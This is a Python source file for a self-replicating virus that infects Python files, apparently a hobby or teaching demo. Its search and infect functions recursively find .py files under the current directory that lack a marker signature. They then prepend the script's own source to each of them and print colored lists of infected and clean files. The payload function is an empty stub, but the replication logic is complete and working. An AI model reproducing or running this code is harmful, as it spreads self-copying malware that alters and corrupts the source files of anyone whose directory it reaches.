#!/usr/bin/python
SIGNATURE="#54762f839e37a91f1a86bd9fc617a67da590ea28"
hostId=[".py"]

def search(path):
	filesToInfect=[]
	fileList=os.listdir(path)
	for fileName in fileList:
		if fileName == __file__:
			pass
		else:
			fullName="{}/{}".format(path,fileName)
			if os.path.isdir(fullName):
				#pass
				filesToInfect.extend(search(fullName))
			elif not isInfected(fullName) and isSuitableHost(fileName,hostId):
				filesToInfect.append(fullName)
	# print("[+] files to infect:\n\t "+str(filesToInfect))
	return filesToInfect

def infect(filesToInfect):
	try:
		virus=open(os.path.abspath(__file__))
		dna=""
		for i,line in enumerate(virus):
			dna+=line
		virus.close()
	except:
		dna=SIGNATURE # only marks the files with the signature, no actual code added
	try:
		for fti in filesToInfect:
			f=open(fti)
			buffer=f.read()
			f.close()
			f=open(fti,"w")
			f.write(dna+buffer)
			f.close()
	except:
		pass
		
def isInfected(fullName):
	# check if file 'fullName' is already infected or not
	contagious=False
	
	try:
		for line in open(fullName):
			if SIGNATURE in line:
				contagious = True
				break		
	except:
		pass
	
	# remove code inbetween these lines once output is not needed anymore
	# print out a colored list of files (will be removed later in the process)
	if contagious:
		tag=infected("[*]")
		fullName=infected(fullName)
		print("{} {}".format(tag,fullName))
	else:
		tag=notInfected("[ ]")
		fullName=notInfected(fullName)
		print("{} {}".format(tag,fullName))
	# do not remove code below this line ---
	return contagious

def outbreak():
	pass
	
def isSuitableHost(fileName,hostId):
	# check if 'fileName' has the correct fileType (e.g. '.py' ending)
	isTarget=False
	try:
		for id in hostId:
			#print(fileName[-3:])
			if id == fileName[-3:]:
				isTarget=True
				break
		return isTarget
	except:
		#print("{} Could not identify viral suitability of host.".format(infected("[-]")))
		return False
def infected(str):
	try:
		return "{}{}{}{}".format(Fore.RED,Style.BRIGHT,str,Fore.RESET)
	except:
		return str
		
def notInfected(str):
	try:
		return "{}{}{}{}".format(Fore.GREEN,Style.BRIGHT,str,Fore.RESET)
	except:
		return str
	
def main():
	print("\n[before infection]")
	infect(search("./"))
	# check again after infection
	print("\n[after infection]")
	search("./")
		
if __name__=="__main__":
	import os
	import datetime
	import colorama
	from colorama import Fore,Back,Style
	colorama.init()
	main()
else:
	pass
